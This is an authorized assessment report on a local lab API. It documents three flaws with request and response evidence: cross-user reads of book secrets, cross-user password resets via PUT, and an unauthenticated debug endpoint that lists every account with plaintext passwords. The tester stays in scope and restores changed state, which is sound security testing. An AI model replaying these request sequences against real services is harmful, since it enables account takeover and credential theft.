# Assessment report — cross-user authorization, http://127.0.0.1:43939

Scope exercised: the single authorized target `http://127.0.0.1:43939/` only, using the six supplied
accounts (`name1`, `name2`, `admin`, `alice`, `bob`, `carol`) and the declared endpoints
`/users/v1/login`, `/me`, `/books/v1`, `/books/v1/{title}`, `/users/v1`, `/users/v1/{username}`,
`/users/v1/{username}/email`, `/users/v1/{username}/password`, `/users/v1/_debug`.
No account registration, no other host/port, nothing persisted outside the disposable instance.
Run marker (nonce) used for all objects/values: `1795452255-288`.

Identity baseline: all six logins succeeded via `POST /users/v1/login` and each token resolved to a
distinct stable subject via `GET /me` (`/data/username`), verified before and after the tests below:

| account | `/me` subject | admin flag |
|---|---|---|
| name1 | name1 | false |
| name2 | name2 | false |
| admin | admin | true |
| alice | alice | false |
| bob | bob | false |
| carol | carol | false |

---

## Finding 1 — books: any authenticated user can read another user's book (including `secret`)

- **Resource class / operation:** `books` / `read` (`GET /books/v1/{title}`)
- **Rule violated:** declared readers = "the account that created the book"; writers = owner.
  (The collection listing returning titles/owners "to anyone" is separately declared and is *not*
  the issue — this is the per-object read of another user's record.)
- **Subjects:** acting = `bob` (also `carol`, `alice`, `name1`, `admin`); owner = `alice`
  (and `bob`, `carol` in the crossing pair tests).
- **Request / response evidence** (fresh objects created in this run, marker in owner-controlled field):

  Owner baseline — create and read as owner, marker `secret-alice-1795452255-288-2169283`:

  ```
  POST /books/v1  (Bearer alice-token)  {"book_title":"book-alice-1795452255-288","secret":"secret-alice-1795452255-288-2169283"}
  -> 200 {"message":"Book has been added.","status":"success"}

  GET /books/v1/book-alice-1795452255-288  (Bearer alice-token)
  -> 200 {"book_title":"book-alice-1795452255-288","owner":"alice","secret":"secret-alice-1795452255-288-2169283"}
  ```

  Cross-user read by a different authenticated subject (not the owner, no sharing state declared):

  ```
  GET /books/v1/book-alice-1795452255-288  (Bearer bob-token)
  -> 200 {"book_title":"book-alice-1795452255-288","owner":"alice","secret":"secret-alice-1795452255-288-2169283"}

  GET /books/v1/book-bob-1795452255-288    (Bearer carol-token)
  -> 200 {"book_title":"book-bob-1795452255-288","owner":"bob","secret":"secret-bob-1795452255-288-2169283"}

  GET /books/v1/book-carol-1795452255-288  (Bearer alice-token)
  -> 200 {"book_title":"book-carol-1795452255-288","owner":"carol","secret":"secret-carol-1795452255-288-2169283"}

  GET /books/v1/book-alice-1795452255-288  (Bearer name1-token)
  -> 200 {"book_title":"book-alice-1795452255-288","owner":"alice","secret":"secret-alice-1795452255-288-2169283"}

  GET /books/v1/book-alice-1795452255-288  (Bearer admin-token)
  -> 200 {"book_title":"book-alice-1795452255-288","owner":"alice","secret":"secret-alice-1795452255-288-2169283"}
  ```

- **How the evidence identifies object and value:** the returned `book_title` matches the unique
  per-run title created in this run, the `owner` field is the other subject, and the returned
  `secret` is byte-identical to the fresh high-entropy marker written only in this run's create
  request — not a value from seed data, a cache, or a previous run.
- **Baseline / controls:**
  - Owner baseline: `alice` retrieves the same object and marker (200, above).
  - Negative control: anonymous `GET /books/v1/book-alice-1795452255-288` → **401**
    `{"detail":"No authorization token provided","status":401,...}` — the route does require a
    session, so the 200s above are authenticated cross-user reads, not public access.
  - Permitted-audience control: `GET /books/v1` (collection) as `bob` → 200 listing
    `{"book_title":...,"user":...}` for all owners, which matches the declared "returns book titles
    and their owners to anyone" and is not reported; this listing does **not** contain `secret`.
- **Limits / qualifications:** no declared sharing/tenant state exists for books, so the other-subject
  read cannot be interpreted as shared access. Books expose no update or delete route
  (`PUT`/`DELETE /books/v1/{title}` → **405**), so those operations were not assessable and no claim
  is made about them.

---

## Finding 2 — user_password: any authenticated user can change another user's password

- **Resource class / operation:** `user_password` / `update` (`PUT /users/v1/{username}/password`)
- **Rule violated:** declared writers = "the named account only".
- **Subjects:** acting = `alice` (role `user`); victim/owner = `bob`; corroborating pair earlier in
  the run = acting `bob` → victim `carol`.
- **Request / response evidence** (fresh password value `alice-set-bob-1795452255-288`):

  ```
  PUT /users/v1/bob/password   (Bearer alice-token)
  {"password":"alice-set-bob-1795452255-288"}
  -> 204  (empty body)

  POST /users/v1/login {"username":"bob","password":"bob-smoke-pw"}            (original)
  -> 200 {"status":"fail","message":"Password is not correct for the given username."}

  POST /users/v1/login {"username":"bob","password":"alice-set-bob-1795452255-288"}
  -> 200 {"auth_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","message":"Successfully logged in.","status":"success"}

  GET /me  (Bearer <token from the login above>)
  -> 200 {"data":{"admin":false,"email":"bob@example.test","username":"bob"},"status":"success"}
  ```

  Independent corroboration (different pair, same behavior):

  ```
  PUT /users/v1/carol/password  (Bearer bob-token) {"password":"crosspw-1795452274"}  -> 204
  POST /users/v1/login carol / carol-smoke-pw   -> {"status":"fail","message":"Password is not correct ..."}
  POST /users/v1/login carol / crosspw-1795452274 -> {"auth_token":"...","status":"success"}
  ```

- **How the evidence identifies the effect:** the 204 alone is not treated as proof. The decisive
  evidence is target state: the original credential for the *named* account (`bob`) stops
  authenticating, the fresh actor-chosen value authenticates, and the resulting token's `/me`
  subject is `bob` — so the credential of the named subject, not the actor, was changed.
- **Baseline / controls:**
  - Identity baseline before the write: `GET /me` with bob's pre-existing token →
    `{"data":{...,"username":"bob"},"status":"success"}`.
  - Negative control: anonymous `PUT /users/v1/bob/password` → **401**
    `{"detail":"No authorization token provided",...}`; the route requires a session.
  - Self-write control: `bob` restores his own password via
    `PUT /users/v1/bob/password {"password":"bob-smoke-pw"}` → 204, and login with the original
    password succeeds again — the named-account path itself works and the observation is specific to
    the acting subject being neither `bob` nor an administrator (`alice` is role `user`, `/me`
    `admin:false`).
- **Limits / qualifications:** `user_password` is declared "not readable", so the new value was
  confirmed behaviorally through login + `/me` rather than by reading the field. The instance was
  restored to its pre-test credential afterwards (carol's password and all touched emails were
  reset to their original values; final `GET /users/v1/{alice,bob,carol}` shows original emails and
  carol's original password authenticates).

---

## Finding 3 — user_debug: unauthenticated read of all account records, including plaintext passwords

- **Resource class / operation:** `user_debug` / `read` (`GET /users/v1/_debug`)
- **Rule violated:** declared readers = "nobody"; the object is documented as a developer debug
  object returning account records.
- **Subjects:** acting = anonymous visitor (no session); records disclosed belong to
  `name1`, `name2`, `admin`, `alice`, `bob`, `carol`.
- **Request / response evidence:**

  ```
  GET /users/v1/_debug        (no Authorization header)
  -> 200
  {"users":[
    {"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},
    {"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"},
    {"admin":true, "email":"admin@mail.com","password":"pass1","username":"admin"},
    {"admin":false,"email":"alice2@example.com","password":"alice-smoke-pw","username":"alice"},
    {"admin":false,"email":"bob@example.test","password":"bob-smoke-pw","username":"bob"},
    {"admin":false,"email":"carol@example.test","password":"carol-smoke-pw","username":"carol"}]}
  ```

  Same object also returned identically to an authenticated non-admin:
  `GET /users/v1/_debug (Bearer alice-token)` → 200 with the same record set.
- **How the evidence identifies the object and values:** the response is the declared `user_debug`
  collection itself and contains the `username`, `email`, `password`, and `admin` fields of the
  declared fields list; the credentials shown match values independently confirmed working at
  `POST /users/v1/login` (e.g. `name1`/`pass1`, `admin`/`pass1`, `carol`/`carol-smoke-pw` after
  restoration), so these are live account records, not placeholders.
- **Baseline / controls:**
  - Permitted-audience control: `GET /users/v1` anonymously → 200 with
    `{"username","email"}` only — matching the declared public listing and **not** containing
    `password` or `admin`. This shows the extra fields and the `_debug` path are additional to the
    declared public behavior.
  - `GET /users/v1/{username}` anonymously → 200 with `{"username","email"}`, also matching the
    declared "anyone" reader for the account listing.
- **Limits / qualifications:** this is a read-only disclosure observation; no state was modified via
  this endpoint. The two `alice`/`bob` email values in the transcript reflect the email-write tests
  below and were restored afterwards (final state: `alice@example.test`, `bob@example.test`,
  `carol@example.test`).

---

## Tested and NOT reported (controls / matching declared policy)

- **users / read** — `GET /users/v1` and `GET /users/v1/{username}` anonymously → 200 with only
  `username` + `email`. Declared readers = "anyone, including a visitor without a session" — match,
  no finding.
- **user_email / read** — the account listing exposes `email` to anyone, declared as such — match,
  no finding.
- **user_email / update** — `PUT /users/v1/{other}/email` by a non-owner returns 204 but the effect
  is applied to the **acting** subject, not the named one. Verified: `bob` `PUT
  /users/v1/alice/email` left alice's record unchanged and changed bob's own record; `bob` `PUT
  /users/v1/carol/email {"bobset-...@example.com"}` likewise wrote to bob, with `/me` afterwards
  showing bob's email. Because the named account's value is not modified, this does not contradict
  "writers: the named account only", so no cross-user finding is claimed for this route. (The
  path-username-ignored behavior is noted as a functional quirk only; it was not escalated into a
  finding because the measured actor/effect do not cross the user boundary.)
- **books / create** — owner-only creation on the authenticated session worked for alice, bob,
  carol; each create was confirmed by an owner read returning the fresh marker.
- **books / update, books / delete** — not declared, and `PUT`/`DELETE /books/v1/{title}` return
  **405**; not assessable, no claim made.
- **users / delete (admin)** — outside the declared operation list for this task (users declares
  only `read`); not exercised, no claim made.

## Notes

No other target, host, or port was contacted. Timestamps of the run are 2026-11-23 ~16:44 UTC.
All mutated state (alice/bob/carol emails, bob and carol passwords) was restored to the engagement
values after evidence capture, and identity (`GET /me`) was rechecked for the re-used tokens after
each credential-mutating request.
